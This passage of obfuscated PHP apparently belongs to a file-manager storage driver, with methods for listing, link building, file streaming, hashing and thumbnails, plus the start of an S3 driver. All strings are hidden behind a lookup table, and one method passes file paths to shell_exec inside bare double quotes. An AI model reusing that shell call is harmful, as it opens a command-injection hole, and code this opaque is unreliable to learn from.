$this->listPath($“ƒ§¾, !0); if (!$Ü×´äîÚ) { return; } $ÚÍ«îª“ = array_merge($Ü×´äîÚ[$úöàó¥[75]], $Ü×´äîÚ[$úöàó¥[74]]); foreach ($ÚÍ«îª“ as $³ş‘ú±Ò) { $ÔğîºûÃ = $³ş‘ú±Ò[$úöàó¥[29]] == $úöàó¥[77]; $ç„‹Ô¡¸ = array($úöàó¥[76] => $³ş‘ú±Ò[$úöàó¥[76]], $úöàó¥[77] => $ÔğîºûÃ); if (isset($³ş‘ú±Ò[$úöàó¥[78]])) { $ç„‹Ô¡¸[$úöàó¥[78]] = $³ş‘ú±Ò[$úöàó¥[78]]; } if (isset($³ş‘ú±Ò[$úöàó¥[84]])) { $ç„‹Ô¡¸[$úöàó¥[84]] = $³ş‘ú±Ò[$úöàó¥[84]]; } if (!$ÔğîºûÃ) { $•Ú”¶—[] = $ç„‹Ô¡¸; continue; } $•Ú”¶—[] = $ç„‹Ô¡¸; $ä©É¸ƒ‰ = $³ş‘ú±Ò[$úöàó¥[76]]; $­ßí¸Àå = $this->pathDriver; if (substr($³ş‘ú±Ò[$úöàó¥[76]], 0, strlen($­ßí¸Àå)) == $­ßí¸Àå) { $ä©É¸ƒ‰ = substr($ä©É¸ƒ‰, strlen($­ßí¸Àå)); } $this->listAllMake($ä©É¸ƒ‰, $•Ú”¶—); } } public function listAllSimple($›“ı€Ã) { $ÕÕ‘ôÂ =& $_SERVER[Ù×¯Ø…]; $¨Â¹óª = array(); $ÓÄ™Ï² = $this->listAll($›“ı€Ã); $¹„ÉùÉ‚ = $this->getPathOuter($›“ı€Ã); foreach ($ÓÄ™Ï² as $·×æ³£) { $¶ØÒ = $·×æ³£[$ÕÕ‘ôÂ[76]]; $Ùˆ«Úú = $·×æ³£[$ÕÕ‘ôÂ[76]]; if (isset($·×æ³£[$ÕÕ‘ôÂ[85]])) { $¶ØÒ = $·×æ³£[$ÕÕ‘ôÂ[85]][$ÕÕ‘ôÂ[76]]; $·×æ³£[$ÕÕ‘ôÂ[78]] = $·×æ³£[$ÕÕ‘ôÂ[85]][$ÕÕ‘ôÂ[78]]; $·×æ³£[$ÕÕ‘ôÂ[84]] = $·×æ³£[$ÕÕ‘ôÂ[85]][$ÕÕ‘ôÂ[84]]; } else { $Ùˆ«Úú = substr($·×æ³£[$ÕÕ‘ôÂ[76]], strlen(get_path_father($¹„ÉùÉ‚))); $Ùˆ«Úú = $ÕÕ‘ôÂ[8] . ltrim($Ùˆ«Úú, $ÕÕ‘ôÂ[8]); } $Áğ¿„ = array($ÕÕ‘ôÂ[76] => $Ùˆ«Úú, $ÕÕ‘ôÂ[77] => $·×æ³£[$ÕÕ‘ôÂ[77]]); if (isset($·×æ³£[$ÕÕ‘ôÂ[78]]) && !$·×æ³£[$ÕÕ‘ôÂ[77]]) { $Áğ¿„[$ÕÕ‘ôÂ[78]] = $·×æ³£[$ÕÕ‘ôÂ[78]]; } if (isset($·×æ³£[$ÕÕ‘ôÂ[84]])) { $Áğ¿„[$ÕÕ‘ôÂ[84]] = $·×æ³£[$ÕÕ‘ôÂ[84]]; } if (!$·×æ³£[$ÕÕ‘ôÂ[77]]) { $Áğ¿„[$ÕÕ‘ôÂ[86]] = $¶ØÒ; } $¨Â¹óª[] = $Áğ¿„; } return $¨Â¹óª; } public function upload($Ğá›¦Øù, $’Áüß¯¤, $È‹ğ¾ã = false, $²ÆÜ˜ä = REPEAT_REPLACE) { } public function uploadFileByID($İ×§Ø¿, $Ûí—Çç, $»ş¦Ô“Ş) { } public function uploadFileByPath($Ó³‰ÎØ…, $îâ†šÍú, $ËÀ¾öğ = array()) { } public function isUploadServer() { $Ğ¡¹Şú =& $_SERVER[Ù×¯Ø…]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ğ¡¹Şú[87]) { return !0; } return $GLOBALS[$Ğ¡¹Şú[6]][$Ğ¡¹Şú[88]][$Ğ¡¹Şú[89]]; } public function isFileOutServer() { $ÕßçÃ¤ş =& $_SERVER[Ù×¯Ø…]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ÕßçÃ¤ş[87]) { return !0; } return $GLOBALS[$ÕßçÃ¤ş[6]][$ÕßçÃ¤ş[88]][$ÕßçÃ¤ş[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($û´Èó©“) { $éüæ©ÏÂ =& $_SERVER[Ù×¯Ø…]; if (!$this->isCdnHost()) { return $û´Èó©“; } return str_replace(trim(get_url_root($û´Èó©“), $éüæ©ÏÂ[8]), trim($this->cdnHost, $éüæ©ÏÂ[8]), $û´Èó©“); } public function uploadLink($Ã«²¸‹, $íóû†ËÙ = 0) { $·¥¤¡ ç =& $_SERVER[Ù×¯Ø…]; if ($this->isUploadServer()) { return; } $®—½§÷ = $this->getType(); if (!in_array($®—½§÷, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $íÔ¥Ò§ğ = 1024 * 1024 * 10; $ü¯Íó‰ = $íóû†ËÙ <= $íÔ¥Ò§ğ ? $·¥¤¡ ç[91] : $·¥¤¡ ç[92]; $şúö‰µô = (!$íóû†ËÙ ? 1 : ceil($íóû†ËÙ / pow(1024, 3))) * 3600 * 4; $À†á®äĞ = $this->{$ü¯Íó‰}($Ã«²¸‹, $şúö‰µô); if ($À†á®äĞ) { $À†á®äĞ[$·¥¤¡ ç[93]] = $Ã«²¸‹; $À†á®äĞ[$·¥¤¡ ç[94]] = $®—½§÷; } return $À†á®äĞ; } public function uploadFormData($„Û–Ûë, $˜ÖĞ¿şĞ = 3600) { } public function multiUploadFormData($Íäµ¹ˆ, $ñÊ—©Ú = 3600) { } public function download($÷‚ëƒÊ, $úÊÈ®‡) { } public function ext($şØèğ•¦) { $¤—´¯õ‘ =& $_SERVER[Ù×¯Ø…]; if (strpos($şØèğ•¦, $¤—´¯õ‘[8]) === -1) { $µØõÎûÁ = $şØèğ•¦; } else { $µØõÎûÁ = $this->pathThis($şØèğ•¦); } $ı…äî = $¤—´¯õ‘[33]; if (strstr($µØõÎûÁ, $¤—´¯õ‘[95])) { $ı…äî = substr($µØõÎûÁ, strrpos($µØõÎûÁ, $¤—´¯õ‘[95]) + 1); $ı…äî = strtolower($ı…äî); } if (strlen($ı…äî) > 3 && preg_match($¤—´¯õ‘[96], $ı…äî, $ÉÅÆ»öÓ)) { $ı…äî = $¤—´¯õ‘[33]; } return $ı…äî; } public function pathThis($ªí­‡Å„) { $Óš‡ãÔ =& $_SERVER[Ù×¯Ø…]; $ªí­‡Å„ = str_replace($Óš‡ãÔ[97], $Óš‡ãÔ[8], rtrim($ªí­‡Å„, $Óš‡ãÔ[8])); $›‡¬÷» = strrpos($ªí­‡Å„, $Óš‡ãÔ[8]); if ($›‡¬÷» === !1) { return $ªí­‡Å„; } return substr($ªí­‡Å„, $›‡¬÷» + 1); } public function pathFather($³°ªıôş) { $’‰€¢†æ =& $_SERVER[Ù×¯Ø…]; $³°ªıôş = str_replace($’‰€¢†æ[97], $’‰€¢†æ[8], rtrim($³°ªıôş, $’‰€¢†æ[8])); $ÅËÑïÍ¼ = strrpos($³°ªıôş, $’‰€¢†æ[8]); if ($ÅËÑïÍ¼ === !1) { return $’‰€¢†æ[33]; } return substr($³°ªıôş, 0, $ÅËÑïÍ¼ + 1); } public function hashSimple($´‚¡Áè) { $º´¹œÑ =& $_SERVER[Ù×¯Ø…]; if (!$´‚¡Áè) { return md5($º´¹œÑ[33]); } $Åö¥¯€„ = $this->size($´‚¡Áè); $ªåÉ¥Û = 200; $ú‚èëƒë = 50; if ($Åö¥¯€„ <= $ªåÉ¥Û * $ú‚èëƒë) { return $this->hashMd5($´‚¡Áè) . $Åö¥¯€„; } $–ºŠàÍ£ = intval($Åö¥¯€„ / $ú‚èëƒë); $Ä¼ÊóÎº = $º´¹œÑ[33]; for ($°Éã®ÀÂ = 0; $°Éã®ÀÂ < $ú‚èëƒë; $°Éã®ÀÂ++) { $Ä¼ÊóÎº .= $this->fileSubstr($´‚¡Áè, $–ºŠàÍ£ * $°Éã®ÀÂ, $ªåÉ¥Û); } $Ä¼ÊóÎº .= $this->fileSubstr($´‚¡Áè, $Åö¥¯€„ - $ªåÉ¥Û, $ªåÉ¥Û); return md5($Ä¼ÊóÎº) . $Åö¥¯€„; } public static $md5Cache = array(); public function hashMd5($ª…Ä÷İ) { if (!$ª…Ä÷İ) { return md5($_SERVER[Ù×¯Ø…][33]); } $ª…Ä÷İ = $this->iconvSystem($ª…Ä÷İ); if (isset(self::$md5Cache[$ª…Ä÷İ])) { return self::$md5Cache[$ª…Ä÷İ]; } self::$md5Cache[$ª…Ä÷İ] = $this->hashMd5Shell($ª…Ä÷İ); if (!self::$md5Cache[$ª…Ä÷İ]) { self::$md5Cache[$ª…Ä÷İ] = @md5_file($ª…Ä÷İ); } return self::$md5Cache[$ª…Ä÷İ]; } private function hashMd5Shell($¿Ì²Ç“) { $“êÈšÉ¨ =& $_SERVER[Ù×¯Ø…]; if (!$¿Ì²Ç“) { return md5($“êÈšÉ¨[33]); } if (!function_exists($“êÈšÉ¨[98])) { return !1; } $¬™ÌÇ™¸ = array($“êÈšÉ¨[99], $“êÈšÉ¨[100]); $×ÊÉ¨êµ = Cache::get($“êÈšÉ¨[101]); if (!$×ÊÉ¨êµ) { $ü¶¥¼åÓ = BASIC_PATH . $“êÈšÉ¨[102]; $öòŞ£ê­ = md5_file($ü¶¥¼åÓ); $×ÊÉ¨êµ = $“êÈšÉ¨[103]; foreach ($¬™ÌÇ™¸ as $³ÇùàúÒ) { $‘¿ºœ¸¸ = shell_exec($³ÇùàúÒ . "\x20\42{$ü¶¥¼åÓ}\42"); if ($‘¿ºœ¸¸ && substr(trim($‘¿ºœ¸¸), 0, 32) == $öòŞ£ê­) { $×ÊÉ¨êµ = $³ÇùàúÒ; break; } } Cache::set($“êÈšÉ¨[101], $×ÊÉ¨êµ, 3600); } if ($×ÊÉ¨êµ == $“êÈšÉ¨[103]) { return !1; } $‘¿ºœ¸¸ = shell_exec($×ÊÉ¨êµ . "\x20\42{$¿Ì²Ç“}\42"); $‘¿ºœ¸¸ = str_replace($“êÈšÉ¨[104], $“êÈšÉ¨[33], $‘¿ºœ¸¸); return substr($‘¿ºœ¸¸, 0, 32); } public function link($êö…À¹µ) { return $êö…À¹µ; } public function fileOut($±Ã±±óÓ, $‰‹Ûóè¢ = false, $¿¹Üú†§ = false, $¤ôè‹ü = '') { $ñøóÍ¤â =& $_SERVER[Ù×¯Ø…]; $this->cacheMethod(null, null); if (!$±Ã±±óÓ || !$this->exist($±Ã±±óÓ)) { show_json(LNG($ñøóÍ¤â[105]), !1, $¿¹Üú†§); } $Úš›ã¾Š = $this->getType() == $ñøóÍ¤â[106]; $¿‹»ÁéÑ = $GLOBALS[$ñøóÍ¤â[6]][$ñøóÍ¤â[88]][$ñøóÍ¤â[107]][$ñøóÍ¤â[108]]; $ÄŸªÚŠ = (double) $GLOBALS[$ñøóÍ¤â[6]][$ñøóÍ¤â[88]][$ñøóÍ¤â[107]][$ñøóÍ¤â[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $»âÚ–Ö– = $this->infoFull($±Ã±±óÓ); $¶ø©º¢Ã = $»âÚ–Ö–[$ñøóÍ¤â[78]]; $…£ıÖ“Ù = gmdate($ñøóÍ¤â[110], $»âÚ–Ö–[$ñøóÍ¤â[84]]); $ÌğóÃì– = $¿¹Üú†§ ? $¿¹Üú†§ : $this->iconvApp($»âÚ–Ö–[$ñøóÍ¤â[28]]); $âÔ±ºİÃ = 0; $Ê‰±ŒÕÒ = $¶ø©º¢Ã - 1; $¨¦éÚáÚ = $this->ext($ÌğóÃì–); if (in_array($¨¦éÚáÚ, array($ñøóÍ¤â[111], $ñøóÍ¤â[112], $ñøóÍ¤â[113], $ñøóÍ¤â[114]))) { $¨¦éÚáÚ = $ñøóÍ¤â[115]; } if (!$¤ôè‹ü) { $¤ôè‹ü = md5($…£ıÖ“Ù . $this->hashSimple($±Ã±±óÓ)); } $¤ôè‹ü = $ñøóÍ¤â[116] . $¤ôè‹ü . $ñøóÍ¤â[116]; $ˆå·ôªì = get_file_mime($¨¦éÚáÚ); if (strstr($ˆå·ôªì, $ñøóÍ¤â[117])) { $ˆå·ôªì = $ˆå·ôªì . $ñøóÍ¤â[118]; } if ($‰‹Ûóè¢ === !1 && !mime_support($ˆå·ôªì)) { $‰‹Ûóè¢ = !0; $ˆå·ôªì = $ñøóÍ¤â[119]; } header($ñøóÍ¤â[120]); header($ñøóÍ¤â[121] . $ˆå·ôªì); $óš‡‰Î¤ = rawurlencode($ÌğóÃì–); $óš‡‰Î¤ = $ñøóÍ¤â[116] . $óš‡‰Î¤ . $ñøóÍ¤â[122] . $óš‡‰Î¤; if ($‰‹Ûóè¢) { header($ñøóÍ¤â[123]); header($ñøóÍ¤â[124] . $óš‡‰Î¤); } else { header($ñøóÍ¤â[125] . $óš‡‰Î¤); } header($ñøóÍ¤â[126] . gmdate($ñøóÍ¤â[110], time() + 3600 * 24 * 30) . $ñøóÍ¤â[127]); header($ñøóÍ¤â[128]); header($ñøóÍ¤â[129]); header($ñøóÍ¤â[130]); if (isset($_SERVER[$ñøóÍ¤â[131]]) && strtotime($_SERVER[$ñøóÍ¤â[131]]) == $»âÚ–Ö–[$ñøóÍ¤â[84]]) { header($ñøóÍ¤â[132], !0, 304); die; } if (isset($_SERVER[$ñøóÍ¤â[133]]) && $_SERVER[$ñøóÍ¤â[133]] == $¤ôè‹ü) { header($ñøóÍ¤â[134] . $¤ôè‹ü, !0, 304); die; } header($ñøóÍ¤â[134] . $¤ôè‹ü); header($ñøóÍ¤â[135] . $…£ıÖ“Ù . $ñøóÍ¤â[127]); header($ñøóÍ¤â[136] . $ÌğóÃì–); header($ñøóÍ¤â[137]); header($ñøóÍ¤â[138] . $¶ø©º¢Ã); header($ñøóÍ¤â[139]); if (!$‰‹Ûóè¢ && $¨¦éÚáÚ == $ñøóÍ¤â[140]) { if ($¶ø©º¢Ã > 1024 * 1024 * 5) { die; } $ô¥÷®¼ƒ = $this->getContent($±Ã±±óÓ); $ô¥÷®¼ƒ = Html::clearSVG($ô¥÷®¼ƒ); header($ñøóÍ¤â[141] . strlen($ô¥÷®¼ƒ)); echo $ô¥÷®¼ƒ; die; } $œ–â–İ = strtolower($_SERVER[$ñøóÍ¤â[142]]); if ($Úš›ã¾Š && $œ–â–İ && $¿‹»ÁéÑ) { if (strstr($œ–â–İ, $ñøóÍ¤â[143])) { header($ñøóÍ¤â[144] . $±Ã±±óÓ); } else { if (strstr($œ–â–İ, $ñøóÍ¤â[145])) { header($ñøóÍ¤â[146] . $±Ã±±óÓ); } else { if (strstr($œ–â–İ, $ñøóÍ¤â[147])) { header($ñøóÍ¤â[148] . $±Ã±±óÓ); } } } if ($ÄŸªÚŠ) { header($ñøóÍ¤â[149] . $ÄŸªÚŠ); } return; } if (isset($_SERVER[$ñøóÍ¤â[150]])) { if (preg_match($ñøóÍ¤â[151], $_SERVER[$ñøóÍ¤â[150]], $˜Õ¯ÌĞù)) { $âÔ±ºİÃ = intval($˜Õ¯ÌĞù[1]); if (!empty($˜Õ¯ÌĞù[2])) { $Ê‰±ŒÕÒ = intval($˜Õ¯ÌĞù[2]); } } header($ñøóÍ¤â[152]); header("\x43\x6f\156\x74\145\x6e\164\55\x52\141\x6e\147\x65\72\40\142\171\164\145\x73\x20{$âÔ±ºİÃ}\x2d{$Ê‰±ŒÕÒ}\57" . $¶ø©º¢Ã); } else { header($ñøóÍ¤â[153]); } $×ÃæóÀ = !0; if ($_SERVER[$ñøóÍ¤â[154]] == $ñøóÍ¤â[155] && $¶ø©º¢Ã > 1204 * 1024 * 1024 * 2) { $×ÃæóÀ = !1; } if ($×ÃæóÀ) { header($ñøóÍ¤â[156] . ($Ê‰±ŒÕÒ - $âÔ±ºİÃ + 1)); } if ($_SERVER[$ñøóÍ¤â[157]] == $ñøóÍ¤â[158]) { return; } $œÊ‡ÇŞ = 1024 * 100; $ª²ĞÆßï = 0; if ($ÄŸªÚŠ) { $ª²ĞÆßï = intval(1000 * 1000 * ($œÊ‡ÇŞ / $ÄŸªÚŠ)); } while ($âÔ±ºİÃ <= $Ê‰±ŒÕÒ) { $ØŸè¼ãı = timeFloat(); check_abort(); $Â˜Ò«¬ = $Ê‰±ŒÕÒ - $âÔ±ºİÃ + 1; if ($Â˜Ò«¬ <= $œÊ‡ÇŞ) { $œÊ‡ÇŞ = $Â˜Ò«¬; } echo $this->fileSubstr($±Ã±±óÓ, $âÔ±ºİÃ, $œÊ‡ÇŞ); $âÔ±ºİÃ += $œÊ‡ÇŞ; if ($œÊ‡ÇŞ == $Â˜Ò«¬) { $âÔ±ºİÃ = $Ê‰±ŒÕÒ + 1; } if ($ª²ĞÆßï) { $ßûşøôà = intval(1000 * 1000 * (timeFloat() - $ØŸè¼ãı)); $»ö¿íÏ¦ = $ª²ĞÆßï - $ßûşøôà; if ($»ö¿íÏ¦ > 5) { usleep($»ö¿íÏ¦); } } } } public function fileOutServer($ÚÛŞ´¬Ç, $Âºú´õş = false, $ÎŞãûšö = false, $’Öã§óš = '') { $this->fileOut($ÚÛŞ´¬Ç, $Âºú´õş, $ÎŞãûšö, $’Öã§óš); } public function fileOutLink($¦ÈîŞÏÁ) { header($_SERVER[Ù×¯Ø…][159] . $¦ÈîŞÏÁ); die; } public function cacheMethod($ÈÛ—ºº, $œï†‘Åœ, $ÔÕ¥’ƒ = null) { $ã¨Ÿ•ì =& $_SERVER[Ù×¯Ø…]; static $Ó‡ÄÃŸ = array(); $áßà·ï¥ = $œï†‘Åœ ? ltrim($this->getPathOuter($œï†‘Åœ), $ã¨Ÿ•ì[8]) : $œï†‘Åœ; $´Œ€¸Ï÷ = $ã¨Ÿ•ì[160] . $ÈÛ—ºº . $ã¨Ÿ•ì[161] . rtrim($áßà·ï¥, $ã¨Ÿ•ì[8]); if (is_null($ÈÛ—ºº)) { $Ó‡ÄÃŸ = array(); return; } if (is_null($œï†‘Åœ)) { unset($Ó‡ÄÃŸ[$´Œ€¸Ï÷]); return; } if (!is_null($ÔÕ¥’ƒ)) { $Ó‡ÄÃŸ[$´Œ€¸Ï÷] = $ÔÕ¥’ƒ; return; } $è£æë = isset($Ó‡ÄÃŸ[$´Œ€¸Ï÷]) ? $Ó‡ÄÃŸ[$´Œ€¸Ï÷] : null; if (!is_null($è£æë)) { return $è£æë; } $è£æë = $this->{$ÈÛ—ºº}($œï†‘Åœ); $Ó‡ÄÃŸ[$´Œ€¸Ï÷] = $è£æë; return $è£æë; } public function fileOutImage($•Æ¦ö®ã, $È›êÆ÷Õ = 250) { $ì´ùˆ¾ë =& $_SERVER[Ù×¯Ø…]; set_timeout(); if (substr($•Æ¦ö®ã, 0, 4) == $ì´ùˆ¾ë[147]) { $this->fileOutLink($•Æ¦ö®ã); } $…õ´Êİ… = $this->info($•Æ¦ö®ã); $¥ƒ–§â‰ = $…õ´Êİ…[$ì´ùˆ¾ë[28]]; $ŞƒÑÂ¸Â = !1; if (isset($GLOBALS[$ì´ùˆ¾ë[162]]) && $GLOBALS[$ì´ùˆ¾ë[162]][$ì´ùˆ¾ë[76]] == $…õ´Êİ…[$ì´ùˆ¾ë[76]]) { $ÆÖˆß½ = $GLOBALS[$ì´ùˆ¾ë[162]][$ì´ùˆ¾ë[163]]; if (!$…õ´Êİ…[$ì´ùˆ¾ë[164]]) { $…õ´Êİ…[$ì´ùˆ¾ë[164]] = $GLOBALS[$ì´ùˆ¾ë[162]]; } if (isset($ÆÖˆß½[$ì´ùˆ¾ë[165]])) { if ($ÆÖˆß½[$ì´ùˆ¾ë[165]] <= $È›êÆ÷Õ && $ÆÖˆß½[$ì´ùˆ¾ë[166]] <= $È›êÆ÷Õ) { $ŞƒÑÂ¸Â = !0; } } $¥ƒ–§â‰ = $…õ´Êİ…[$ì´ùˆ¾ë[164]][$ì´ùˆ¾ë[28]]; } if ($…õ´Êİ…[$ì´ùˆ¾ë[78]] <= 1024 * 50 || $ŞƒÑÂ¸Â || !function_exists($ì´ùˆ¾ë[167]) || $…õ´Êİ…[$ì´ùˆ¾ë[168]] == $ì´ùˆ¾ë[169]) { return $this->fileOut($•Æ¦ö®ã, !1, $¥ƒ–§â‰); } if (isset($…õ´Êİ…[$ì´ùˆ¾ë[164]][$ì´ùˆ¾ë[170]])) { $ßû»±½Á = $…õ´Êİ…[$ì´ùˆ¾ë[164]][$ì´ùˆ¾ë[170]]; } else { if (isset($…õ´Êİ…[$ì´ùˆ¾ë[164]][$ì´ùˆ¾ë[171]])) { $ßû»±½Á = $…õ´Êİ…[$ì´ùˆ¾ë[164]][$ì´ùˆ¾ë[171]]; } else { $ßû»±½Á = md5("{$…õ´Êİ…[$ì´ùˆ¾ë[28]]}\137{$…õ´Êİ…[$ì´ùˆ¾ë[76]]}\137{$…õ´Êİ…[$ì´ùˆ¾ë[78]]}"); } } $Ü©ü·’Œ = "{$ßû»±½Á}\x5f{$È›êÆ÷Õ}\x2e\x70\156\x67"; if (!($—ıá‡Ø³ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ì´ùˆ¾ë[172]))) { $Ç®Ø³ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ì´ùˆ¾ë[173]); } else { $Ç®Ø³ = KodIO::make($—ıá‡Ø³); } if ($—ıá‡Ø³ = IO::fileNameExist($Ç®Ø³, $Ü©ü·’Œ)) { $‘ŸÔÁ¯Ë = KodIO::make($—ıá‡Ø³); return IO::fileOut($‘ŸÔÁ¯Ë, !1, $¥ƒ–§â‰); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $‘ŸÔÁ¯Ë = DATA_THUMB . $Ü©ü·’Œ; del_file($‘ŸÔÁ¯Ë); if (!@file_exists($‘ŸÔÁ¯Ë)) { $Û–éà× = TEMP_FILES; if (!is_dir($Û–éà×)) { mk_dir($Û–éà×); } $÷ÆîÕé = $Û–éà× . $ßû»±½Á . $ì´ùˆ¾ë[95] . $…õ´Êİ…[$ì´ùˆ¾ë[168]]; if (!@file_exists($÷ÆîÕé)) { $÷ÆîÕé = $this->download($•Æ¦ö®ã, $÷ÆîÕé); } ImageThumb::createThumb($÷ÆîÕé, $‘ŸÔÁ¯Ë, $È›êÆ÷Õ, $È›êÆ÷Õ * 10); } if (!file_exists($‘ŸÔÁ¯Ë) || filesize($‘ŸÔÁ¯Ë) < 100) { return @file_exists($÷ÆîÕé) ? IO::fileOut($÷ÆîÕé) : $this->fileOut($•Æ¦ö®ã); } if (!($ô„ÄµğÅ = IO::move($‘ŸÔÁ¯Ë, $Ç®Ø³))) { return IO::fileOut($‘ŸÔÁ¯Ë); } del_file($‘ŸÔÁ¯Ë); IO::fileOut($ô„ÄµğÅ); } public function fileOutImageServer($²ŞÎÇ», $­ŠÅõÇé = 250) { $this->fileOutImage($²ŞÎÇ», $­ŠÅõÇé); } public function fileNameAuto($åï˜ƒıÄ, $ÌòÆÊ©, $É¤°÷ï = REPEAT_RENAME, $úïş¯ƒá = false) { $åÚöÕæ¯ =& $_SERVER[Ù×¯Ø…]; $ÑİËœê„ = $åï˜ƒıÄ === $åÚöÕæ¯[33] ? $ÌòÆÊ© : rtrim($åï˜ƒıÄ, $åÚöÕæ¯[8]) . $åÚöÕæ¯[8] . $ÌòÆÊ©; if ($É¤°÷ï == REPEAT_REPLACE || !$this->exist($ÑİËœê„) || $úïş¯ƒá && $É¤°÷ï != REPEAT_RENAME_FOLDER) { return $ÌòÆÊ©; } if ($É¤°÷ï == REPEAT_SKIP) { return !1; } $Ä³ñ®ó = $åÚöÕæ¯[95] . get_path_ext($ÌòÆÊ©); $Ä³ñ®ó = $Ä³ñ®ó == $åÚöÕæ¯[95] || $úïş¯ƒá ? $åÚöÕæ¯[33] : $Ä³ñ®ó; $Ì…‹À™Â = 1; $æ©““Êœ = substr($ÌòÆÊ©, 0, strlen($ÌòÆÊ©) - strlen($Ä³ñ®ó)); $ùÉ ¥× = $æ©““Êœ . "\50{$Ì…‹À™Â}\x29{$Ä³ñ®ó}"; while ($this->exist(rtrim($åï˜ƒıÄ, $åÚöÕæ¯[8]) . $åÚöÕæ¯[8] . $ùÉ ¥×)) { $ùÉ ¥× = $æ©““Êœ . "\50{$Ì…‹À™Â}\x29{$Ä³ñ®ó}"; $Ì…‹À™Â++; } return $ùÉ ¥×; } private function fileNameAutoList($„™ş£Áê, $ç…°ÄÉ´, $Ç°š¾Ç½ = false) { $Ä¸‚Òå =& $_SERVER[Ù×¯Ø…]; $æÛùÚ½° = $this->listPath($„™ş£Áê, !0); $æÛùÚ½° = array_merge($æÛùÚ½°[$Ä¸‚Òå[75]], $æÛùÚ½°[$Ä¸‚Òå[74]]); $àÓ¤–•˜ = array_to_keyvalue($æÛùÚ½°, $Ä¸‚Òå[33], $Ä¸‚Òå[28]); $ñ÷è÷ùå = $Ä¸‚Òå[95] . get_path_ext($ç…°ÄÉ´); $ñ÷è÷ùå = $ñ÷è÷ùå == $Ä¸‚Òå[95] || $Ç°š¾Ç½ ? $Ä¸‚Òå[33] : $ñ÷è÷ùå; $»·ğÊéÀ = substr($ç…°ÄÉ´, 0, strlen($ç…°ÄÉ´) - strlen($ñ÷è÷ùå)); $„‚´ = $»·ğÊéÀ . "\x28\60\51{$ñ÷è÷ùå}"; for ($—¿½¯Ô = 1; $—¿½¯Ô <= count($àÓ¤–•˜) + 1; $—¿½¯Ô++) { $„‚´ = $»·ğÊéÀ . "\50{$—¿½¯Ô}\51{$ñ÷è÷ùå}"; if (!in_array_not_case($„‚´, $àÓ¤–•˜)) { return $„‚´; } } return $„‚´; } public function listAllFiles($½ÇÆŒõí, $âÄ†¨Ì, $†µ…³ÔÛ = array()) { $¸ó²•µ =& $_SERVER[Ù×¯Ø…]; if (empty($âÄ†¨Ì)) { return array(); } $ş·ñ²îÃ = array(); $½ÇÆŒõí = trim($½ÇÆŒõí, $¸ó²•µ[8]); foreach ($âÄ†¨Ì as $¡©æ²Ç¬) { $Å—ßãÃç = ltrim(substr(trim($¡©æ²Ç¬, $¸ó²•µ[8]), strlen($½ÇÆŒõí)), $¸ó²•µ[8]); $ş·ñ²îÃ = array_merge($ş·ñ²îÃ, $this->slicePath($Å—ßãÃç)); } $ÁçïÈŠŠ = array(); foreach (array_unique($ş·ñ²îÃ) as $¡©æ²Ç¬) { $¶µ•Ø‰© = array($¸ó²•µ[76] => $this->getPathOuter($¸ó²•µ[8] . $½ÇÆŒõí . $¸ó²•µ[8] . $¡©æ²Ç¬), $¸ó²•µ[77] => 1, $¸ó²•µ[78] => 0); if (substr($¡©æ²Ç¬, -1) != $¸ó²•µ[8]) { $¶µ•Ø‰©[$¸ó²•µ[77]] = 0; $¤²ˆÈÑŠ = $this->getPath($½ÇÆŒõí . $¸ó²•µ[8] . $¡©æ²Ç¬); $¶µ•Ø‰©[$¸ó²•µ[78]] = isset($†µ…³ÔÛ[$¤²ˆÈÑŠ]) ? $†µ…³ÔÛ[$¤²ˆÈÑŠ] : $this->size($¤²ˆÈÑŠ); } $ÁçïÈŠŠ[] = $¶µ•Ø‰©; } return $ÁçïÈŠŠ; } public function slicePath($—Ä¡ÙÖ¥) { $ê¿¬ı£Ò =& $_SERVER[Ù×¯Ø…]; $§»ñÄ = explode($ê¿¬ı£Ò[8], trim($—Ä¡ÙÖ¥, $ê¿¬ı£Ò[8])); $‹•€«»á = 0; do { ++$‹•€«»á; $“¥±øş[] = implode($ê¿¬ı£Ò[8], array_slice($§»ñÄ, 0, $‹•€«»á)) . $ê¿¬ı£Ò[8]; } while ($‹•€«»á < count($§»ñÄ)); $“¥±øş[count($§»ñÄ) - 1] = $—Ä¡ÙÖ¥; return $“¥±øş; } public function getHost() { $ßÙ×çÁœ =& $_SERVER[Ù×¯Ø…]; $’ñ°ï­ = parse_url(trim($this->domain, $ßÙ×çÁœ[8])); $°÷¯–âÌ = isset($’ñ°ï­[$ßÙ×çÁœ[174]]) ? $’ñ°ï­[$ßÙ×çÁœ[174]] : http_type(); $‰¦éÄ®€ = isset($’ñ°ï­[$ßÙ×çÁœ[175]]) ? $’ñ°ï­[$ßÙ×çÁœ[175]] : $’ñ°ï­[$ßÙ×çÁœ[76]]; if (isset($’ñ°ï­[$ßÙ×çÁœ[176]])) { $‰¦éÄ®€ .= $ßÙ×çÁœ[4] . $’ñ°ï­[$ßÙ×çÁœ[176]]; } return $°÷¯–âÌ . $ßÙ×çÁœ[177] . $‰¦éÄ®€; } public function pathEncode($ñ‡³ëš) { $ø“Ï•ƒá =& $_SERVER[Ù×¯Ø…]; return str_replace($ø“Ï•ƒá[178], $ø“Ï•ƒá[8], rawurlencode($ñ‡³ëš)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($¬È‹Ø²°) { set_timeout(); require_once SDK_DIR . $_SERVER[Ù×¯Ø…][179]; parent::__construct(); $this->_init($¬È‹Ø²°); } public function _init($ûüÌÂÍ„) { foreach ($ûüÌÂÍ„ as $ª´ı‹ÇÎ => $ùËß»¶) { if (isset($this->{$ª´ı‹ÇÎ})) { $this->{$ª´ı‹ÇÎ} = $ùËß»¶; } } $this->endpoint = $ûüÌÂÍ„[$_SERVER[Ù×¯Ø…][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($‡ıÙ—Ó = "\166\x34") { $this->signVer = 